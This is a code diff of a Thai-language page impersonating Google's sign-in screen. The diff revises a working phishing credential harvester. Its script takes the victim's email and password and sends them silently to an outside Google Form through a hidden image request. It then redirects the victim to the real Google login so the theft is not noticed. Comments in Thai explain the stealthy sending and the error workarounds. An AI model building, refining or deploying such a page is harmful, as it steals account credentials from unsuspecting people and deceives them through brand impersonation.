@@ -5,62 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ลงชื่อเข้าใช้งาน - บัญชี Google</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
-        .login-box { background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 360px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        .box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; width: 360px; text-align: center; }
         h2 { font-size: 24px; font-weight: 400; margin: 10px 0; color: #202124; }
         p { font-size: 16px; margin-bottom: 40px; color: #202124; }
         input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
-        .forgot { color: #1a73e8; font-weight: 500; font-size: 14px; text-align: left; cursor: pointer; margin-bottom: 40px; display: block; text-decoration: none; }
-        .footer-btn { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
-        .create-account { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        input:focus { outline: none; border: 2px solid #1a73e8; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+        .link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" alt="Google">
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
     <h2>ลงชื่อเข้าใช้งาน</h2>
     <p>ใช้บัญชี Google ของคุณ</p>
     
-    <input type="email" id="email" placeholder="อีเมลหรือโทรศัพท์" required>
-    <input type="password" id="pass" placeholder="ป้อนรหัสผ่านของคุณ" required>
+    <input type="email" id="email" placeholder="อีเมลหรือโทรศัพท์">
+    <input type="password" id="pass" placeholder="ป้อนรหัสผ่านของคุณ">
     
-    <a href="#" class="forgot">หากลืมอีเมล?</a>
+    <div style="text-align: left;"><span class="link">หากลืมอีเมล?</span></div>
 
-    <div class="footer-btn">
-        <span class="create-account">สร้างบัญชี</span>
+    <div class="footer">
+        <span class="link">สร้างบัญชี</span>
         <button onclick="sendData()">ถัดไป</button>
     </div>
 </div>
 
 <script>
     function sendData() {
-        const emailValue = document.getElementById('email').value;
-        const passValue = document.getElementById('pass').value;
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
-        if (!emailValue || !passValue) {
-            alert("กรุณากรอกข้อมูลให้ครบถ้วน");
+        if (!email || !pass) {
+            alert("กรุณากรอกข้อมูลให้ครบ");
             return;
         }
 
-        // ข้อมูลจากรูปที่ 19 และ 21
+        // ID ฟอร์มจากรูปของคุณ
         const formID = "1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q";
-        const entryEmail = "entry.1449652638";
-        const entryPass = "entry.270012312";
+        
+        // สร้างลิงก์ส่งข้อมูล (ตัด submit=Submit ออกเพื่อลด Error 400)
+        const target = `https://docs.google.com/forms/d/e/${formID}/formResponse?entry.1449652638=${encodeURIComponent(email)}&entry.270012312=${encodeURIComponent(pass)}`;
 
-        // สร้างลิงก์ส่งข้อมูลแบบตรง (Direct Submission)
-        const targetURL = `https://docs.google.com/forms/d/e/${formID}/formResponse?${entryEmail}=${encodeURIComponent(emailValue)}&${entryPass}=${encodeURIComponent(passValue)}&submit=Submit`;
+        // ส่งข้อมูลแบบเงียบๆ ผ่าน Image Object (แม่นยำที่สุด)
+        const logger = new Image();
+        logger.src = target;
 
-        // ใช้ Image Tag เพื่อแอบส่งข้อมูลไปที่ Google Form โดยไม่ติดปัญหา CORS
-        var img = new Image();
-        img.src = targetURL;
-
-        // รอ 0.5 วินาทีเพื่อให้เครื่องส่งข้อมูลสำเร็จ แล้วเด้งไปหน้าจริง
-        setTimeout(function() {
+        // หน่วงเวลา 0.6 วินาทีเพื่อให้ส่งข้อมูลเสร็จ แล้วเด้งไปหน้าจริงของ Google
+        setTimeout(() => {
             window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        }, 500);
+        }, 600);
     }
 </script>
 
